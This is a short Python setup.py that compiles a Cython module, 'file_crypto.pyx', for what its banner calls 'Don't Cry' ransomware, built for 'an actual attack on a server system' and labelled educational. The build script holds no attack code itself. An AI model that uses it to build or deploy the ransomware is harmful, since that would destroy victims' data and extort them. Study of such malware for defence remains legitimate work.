################################################################################
#                             Don't Cry Ransomware                             #
#                          ! EDUCATIONAL PURPOSES ONLY !                       #
################################################################################
# Warning: This is DCry malware, developed to perform an actual attack on a server system.
# Therefore, this malware can cause serious damage to your system and data.
# Use this code with caution and only in advanced simulated cyberattack scenarios under the supervision of at least one cybersecurity expert.

from setuptools import setup
from Cython.Build import cythonize

setup(
    ext_modules=cythonize("file_crypto.pyx", compiler_directives={"language_level": "3"})
)
